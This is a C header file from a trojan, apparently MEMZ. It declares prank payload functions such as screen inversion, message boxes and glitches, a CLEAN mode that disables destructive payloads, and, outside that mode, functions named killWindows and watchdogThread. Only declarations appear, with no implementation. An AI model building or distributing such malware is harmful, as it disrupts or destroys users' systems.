// If this is defined, the trojan will disable all destructive payloads
// and does display a GUI to manually control all of the non-destructive ones.
#define CLEAN

#ifdef CLEAN
// Enable XP styles
#pragma comment(linker,"\"/manifestdependency:type='win32' \
name='Microsoft.Windows.Common-Controls' version='6.0.0.0' \
processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")

// Window attributes
#define BTNWIDTH 200
#define BTNHEIGHT 30
#define COLUMNS 3
#define ROWS ((nPayloads + nPayloads%COLUMNS)/COLUMNS)
#define SPACE 10
#define WINDOWWIDTH COLUMNS * BTNWIDTH + (COLUMNS + 1)*SPACE
#define WINDOWHEIGHT ROWS * BTNHEIGHT + (ROWS + 1)*SPACE + 32
#endif

#pragma once

#include <Windows.h>
#include <TlHelp32.h>
#include <Shlwapi.h>
#include <Psapi.h>
#include <CommCtrl.h>

#include "data.h"
#include "payloads.h"

int random();
void strReverseW(LPWSTR str);

PAYLOADHOST(payloadHostDefault);
PAYLOADHOST(payloadHostVisual);

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

#ifndef CLEAN
void killWindows();
void killWindowsInstant();

DWORD WINAPI ripMessageThread(LPVOID);
DWORD WINAPI watchdogThread(LPVOID);
#else
DWORD WINAPI keyboardThread(LPVOID lParam);
extern BOOLEAN enablePayloads;
BOOL CALLBACK CleanWindowsProc(HWND hwnd, LPARAM lParam);
#endif

PAYLOADFUNCTIONDEFAULT(payloadExecute);
PAYLOADFUNCTIONDEFAULT(payloadCursor);
PAYLOADFUNCTIONVISUAL(payloadInvert);
PAYLOADFUNCTIONDEFAULT(payloadMessageBox);
DWORD WINAPI messageBoxThread(LPVOID);
LRESULT CALLBACK msgBoxHook(int, WPARAM, LPARAM);
PAYLOADFUNCTIONDEFAULT(payloadReverseText);
BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam);
PAYLOADFUNCTIONDEFAULT(payloadSound);
PAYLOADFUNCTIONVISUAL(payloadGlitches);
PAYLOADFUNCTIONDEFAULT(payloadKeyboard);
PAYLOADFUNCTIONVISUAL(payloadTunnel);
PAYLOADFUNCTIONVISUAL(payloadDrawErrors);
PAYLOADHOST(payloadHostCrazyBus);